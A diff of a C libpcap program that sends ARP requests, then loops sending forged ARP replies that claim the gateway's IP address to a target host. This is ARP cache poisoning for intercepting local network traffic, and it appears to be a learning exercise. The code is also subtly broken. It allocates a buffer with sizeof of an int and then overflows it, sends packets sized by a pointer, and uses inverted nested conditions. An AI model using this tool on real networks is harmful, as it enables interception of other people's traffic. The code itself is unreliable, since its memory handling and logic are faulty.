@@ -9,6 +9,7 @@
 #define REQUEST 0x0001
 #define REPLY 0x0002
 
+#pragma pack(1)
 struct eth_header {
 	uint8_t dest_mac[6];
 	uint8_t src_mac[6];
@@ -26,6 +27,7 @@ struct arp_packet {
 	uint8_t target_mac[6];
 	uint32_t target_ip;
 };
+#pragma pack(8)
 
 void init(struct eth_header* eth_hdr, struct arp_packet* arp_pk) {
 	eth_hdr->type = htons(0x0806);
@@ -146,56 +148,75 @@ int main(int argc, char* argv[]) {
 		return -1;
 	}
 
+	int eth_size = sizeof(*eth_hdr);
+	int arp_size = sizeof(*arp_pk);
+	u_char* packet = (u_char*) malloc(sizeof(eth_size+arp_size));
+	memcpy(packet, eth_hdr, eth_size);
+	memcpy(packet+14, arp_pk, arp_size);
 	print_packet(eth_hdr, arp_pk);
-	int total_size = sizeof(*eth_hdr) + sizeof(*arp_pk);
-	u_char* packet = (u_char*) malloc(sizeof(total_size));
-	memcpy(packet, eth_hdr, sizeof(*eth_hdr));
-	memcpy(packet+14, arp_pk, sizeof(*arp_pk));
+
 	printf("PACKET INFO\n");
-	for (int i=0; i<total_size; i++)
-		printf("%02x", packet[i]);
+	for (int i=0; i<(eth_size+arp_size); i++) printf("%02x", packet[i]);
 	printf("\n");
-	if (pcap_sendpacket(handle, packet, total_size) == -1) {
+	if (pcap_sendpacket(handle, packet, eth_size+arp_size) == -1) {
 		printf("Send failure\n");
 		return -1;
 	}
 
-	struct pcap_pkthdr *header;
-	memset(packet, 0, sizeof(total_size));
-	int res = pcap_next_ex(handle, &header, ((const u_char**)&packet));
-	printf("res:%d\n", res);
-	if (res <= 0) return -1;
-	struct eth_header* recv_eth_hdr;
-	struct arp_packet* recv_arp_pk;
-	recv_eth_hdr = (struct eth_header*) packet;
-	recv_arp_pk = (struct arp_packet*) (packet + 14);
-	printf("RECEIVE\n");
-	print_packet(recv_eth_hdr, recv_arp_pk);
-
-	if (ntohs(recv_eth_hdr->type) == 0x0806) {
-		if (ntohs(recv_arp_pk->protocol) == 0x0800) {
-			if (ntohs(recv_arp_pk->opcode) == REPLY && recv_arp_pk->target_ip == sip) {
-				printf("Get ARP Reply packet!\n");
-				printf("TARGET MAC  ");
-				for(int i=0; i<5; i++) printf("%02x: ", recv_eth_hdr->dest_mac[i]);
-				printf("%02x\n", recv_eth_hdr->dest_mac[5]);
-				printf("TARGET IP   %04x\n", recv_arp_pk->sender_ip);
-
-				printf("2) ARP SPOOFING\n");
-				arp_pk->opcode = htons(REPLY);
-				arp_pk->sender_ip = my_inet_aton("123.123.123.123");
-				arp_pk->target_ip = recv_arp_pk->sender_ip;
-				for (int i=0; i<6; i++) arp_pk->sender_mac[i] = 0x11;
-				for (int i=0; i<6; i++) arp_pk->target_mac[i] = eth_hdr->dest_mac[i];
-				pcap_sendpacket(handle, (const u_char*)arp_pk, sizeof(arp_pk));
-				printf("---------------------------------------------------------\nSEND PACKET\n");
+	struct pcap_pkthdr *header = NULL;
+	struct eth_header* recv_eth_hdr = NULL;
+	struct arp_packet* recv_arp_pk = NULL;
+	memset(packet, 0, sizeof(eth_size+arp_size));
+	while (1) {
+		int res = pcap_next_ex(handle, &header, ((const u_char**)&packet));
+		printf("res:%d\n", res);
+		if (res < 0) break;
+		if (res == 0) continue;
+		recv_eth_hdr = (struct eth_header*) packet;
+		recv_arp_pk = (struct arp_packet*) (packet + 14);
+					if (recv_arp_pk->sender_ip == arp_pk->target_ip) {
+						print_packet(recv_eth_hdr, recv_arp_pk);
+						printf("Get ARP Reply packet!\n");
+						printf("TARGET MAC  ");
+						for(int i=0; i<5; i++) printf("%02x: ", recv_eth_hdr->src_mac[i]);
+						printf("%02x\n", recv_eth_hdr->dest_mac[5]);
+						printf("TARGET IP   %04x\n", recv_arp_pk->sender_ip);
+						arp_pk->opcode = htons(REPLY);
+						arp_pk->sender_ip = ((recv_arp_pk->sender_ip & 0x00FFFFFF)) | 0x01000000; // to gateway addr
+						//arp_pk->sender_ip = ((sip & 0x00FFFFFF)) | 0x01000000; // to gateway addr
+						arp_pk->target_ip = recv_arp_pk->sender_ip;
+						//for (int i=0; i<6; i++) arp_pk->sender_mac[i] = 0x11;
+						for (int i=0; i<6; i++) arp_pk->target_mac[i] = eth_hdr->dest_mac[i];
+						pcap_sendpacket(handle, (const u_char*)arp_pk, sizeof(arp_pk));
+						printf("---------------------------------------------------------\nSEND PACKET\n");
+					}
+		if (ntohs(recv_eth_hdr->type) != 0x0806) {
+			if (ntohs(recv_arp_pk->protocol) != 0x0800) {
+				if (ntohs(recv_arp_pk->opcode) != REPLY) {
+					if (recv_arp_pk->sender_ip == arp_pk->target_ip) {
+						print_packet(recv_eth_hdr, recv_arp_pk);
+						printf("Get ARP Reply packet!\n");
+						printf("TARGET MAC  ");
+						for(int i=0; i<5; i++) printf("%02x: ", recv_eth_hdr->dest_mac[i]);
+						printf("%02x\n", recv_eth_hdr->dest_mac[5]);
+						//recv_arp_pk->sender_ip &= 0x00FFFFFF;
+						//recv_arp_pk->sender_ip |= 0x01000000;
+						printf("TARGET IP   %04x\n", recv_arp_pk->sender_ip);
+						arp_pk->opcode = htons(REPLY);
+						arp_pk->sender_ip = ((sip & 0x00FFFFFF)) | 0x01000000; // to gateway addr
+						arp_pk->target_ip = recv_arp_pk->sender_ip;
+						//for (int i=0; i<6; i++) arp_pk->sender_mac[i] = 0x11;
+						for (int i=0; i<6; i++) arp_pk->target_mac[i] = eth_hdr->dest_mac[i];
+						pcap_sendpacket(handle, (const u_char*)arp_pk, sizeof(arp_pk));
+						printf("---------------------------------------------------------\nSEND PACKET\n");
+					}
+				}
 			}
 		}
 	}
 
 	free(eth_hdr);
 	free(arp_pk);
-	free(packet);
 	pcap_close(handle);
 	return 0; 
 }
